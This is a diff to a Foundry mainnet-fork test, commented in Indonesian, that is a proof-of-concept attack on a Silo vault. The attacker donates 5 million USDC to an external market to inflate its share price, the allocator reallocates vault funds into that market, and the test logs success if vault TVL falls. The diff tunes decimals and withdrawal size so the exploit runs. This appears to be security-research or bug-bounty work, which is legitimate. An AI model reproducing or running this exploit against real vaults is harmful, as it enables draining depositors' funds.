@@ -36,34 +36,33 @@ contract SiloXDCForkTest is Test {
         console.log("Vault TVL Sebelum Serangan :", vaultTVLBefore);
         
         address attacker = address(this);
-        // Kita beri attacker 10 Juta USDC (sesuaikan desimal jika perlu, asumsi 18 desimal untuk XDC tokens atau 6)
-        deal(USDC, attacker, 10_000_000 * 1e18); 
+        // USDC menggunakan 6 Desimal, kita beri attacker 10 Juta USDC
+        deal(USDC, attacker, 10_000_000 * 1e6); 
 
         console.log("\n[1] FRONT-RUN: Attacker mendonasi uang ke External Market untuk memanipulasi harga...");
         vm.startPrank(attacker);
-        // Pompa harga Share Token dengan mengirim uang langsung (Spot Balance Attack)
-        IERC20(USDC).transfer(EXTERNAL_MARKET, 5_000_000 * 1e18);
+        // Pompa harga Share Token dengan mengirim 5 Juta USDC langsung (Spot Balance Attack)
+        IERC20(USDC).transfer(EXTERNAL_MARKET, 5_000_000 * 1e6);
         vm.stopPrank();
 
         console.log("\n[2] EKSEKUSI VAULT: Allocator memindahkan dana dari Source Market ke External Market...");
         vm.startPrank(ALLOCATOR);
         
-        // Kita buat 2 instruksi agar balance totalSupplied == totalWithdrawn
         ISiloVault.MarketAllocation[] memory allocations = new ISiloVault.MarketAllocation[](2);
         
-        // Tarik semua dana dari Source Market
+        // PERUBAHAN DI SINI: Tarik hanya 10,000 USDC dari Source Market agar tidak kena NotEnoughLiquidity
         allocations[0] = ISiloVault.MarketAllocation({
             market: IERC4626(SOURCE_MARKET),
-            assets: 0 // 0 berarti withdraw seluruhnya
+            assets: 10_000 * 1e6 // 10 Ribu USDC
         });
         
-        // Setorkan semua dana hasil tarikan tadi ke External Market yang sudah kita manipulasi
+        // Setorkan semua dana (10,000 USDC tadi) ke External Market yang sudah kita manipulasi
         allocations[1] = ISiloVault.MarketAllocation({
             market: IERC4626(EXTERNAL_MARKET),
-            assets: type(uint256).max // type(max) berarti deposit semua dana yang tersedia
+            assets: type(uint256).max // type(max) berarti deposit semua sisa dari totalWithdrawn
         });
         
-        // Eksekusi fungsi reallocate! (Ketiadaan slippage protection diuji di sini)
+        // Eksekusi fungsi reallocate!
         ISiloVault(SILO_VAULT).reallocate(allocations);
         vm.stopPrank();
 
@@ -73,10 +72,10 @@ contract SiloXDCForkTest is Test {
 
         if (vaultTVLAfter < vaultTVLBefore) {
             console.log("\n[+] BINGO! SERANGAN SUKSES!");
-            console.log("[+] Vault kehilangan:", vaultTVLBefore - vaultTVLAfter, "Wei/USDC");
+            console.log("[+] Vault kehilangan:", vaultTVLBefore - vaultTVLAfter, "USDC");
             console.log("[+] Bukti konkret bahwa ketiadaan slippage protection menghancurkan dana Vault di Mainnet!");
         } else {
-            console.log("\n[-] Gagal. TVL tidak berubah atau bertambah. Market mungkin menggunakan Oracle atau Internal Accounting.");
+            console.log("\n[-] Gagal. TVL tidak berubah atau bertambah. Market mungkin kebal Flash Loan (menggunakan Oracle/Internal Accounting).");
         }
     }
 }
